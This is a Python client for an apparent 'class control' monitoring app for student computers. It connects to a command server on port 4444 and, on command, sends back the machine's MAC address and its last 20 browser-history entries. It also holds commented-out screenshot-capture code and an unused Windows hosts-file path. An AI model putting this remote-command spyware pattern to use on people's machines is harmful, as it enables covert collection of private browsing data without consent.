# CLASS CONTROL APP - CLIENT SIDE (STUDENTS)
from getmac import get_mac_address
from browser_history import get_history
from PIL import ImageGrab
import os
import time
import platform as plt
import socket
import pickle
from datetime import datetime

MAC_ADDRESS = get_mac_address()
LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
HOST_PATH = "C:\Windows\System32\drivers\etc\hosts"
IP_ADDRESS = "127.0.0.1"
PLATFORM = {"system": plt.system(), "release": plt.release(), "version": plt.version()}

class CCA_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def start_connection(self):
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        sock.send(sending.encode())

    def execute(self):
        while True:
            command = sock.recv(1024).decode()

            if command == "getmacaddr":
                sock.send(MAC_ADDRESS.encode())

            elif command == "bhistory":
                hist = self.getHistory()
                sock.send(hist)

            elif command == "exit":
                sock.send(b"exit")
                break

    def getTS(self):
        return str(int(time.time()))

    def getHistory(self):
        # Get the last 20 browser history items
        b_history = get_history()
        b_history = b_history.histories  # [(date/url),]
        b_history = b_history[len(b_history) - 20 : len(b_history)]
        f = lambda p : (datetime.timestamp(p[0]), p[1])
        b_history = dict(map(f, b_history))

        return pickle.dumps(b_history)

    # def getScreenshot():
    #     screenshot = ImageGrab.grab()
    #     save_path = os.path.join(__location__, f"scrn/{MAC_ADD}_{getTS()}.jpg")
    #     screenshot.save(save_path)
    #     screenshot.show()
    #     return save_path


client = CCA_CLIENT("127.0.0.1", 4444)

if __name__ == "__main__":
    client.start_connection()
    client.execute()
